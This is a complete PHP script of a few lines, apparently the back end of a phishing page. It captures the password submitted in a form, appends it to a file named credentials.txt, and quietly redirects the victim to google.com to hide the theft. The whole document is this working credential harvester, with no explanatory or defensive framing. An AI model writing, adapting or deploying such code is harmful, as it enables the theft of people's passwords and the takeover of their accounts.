<?php

file_put_contents("credentials.txt", " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://google.com');
exit();
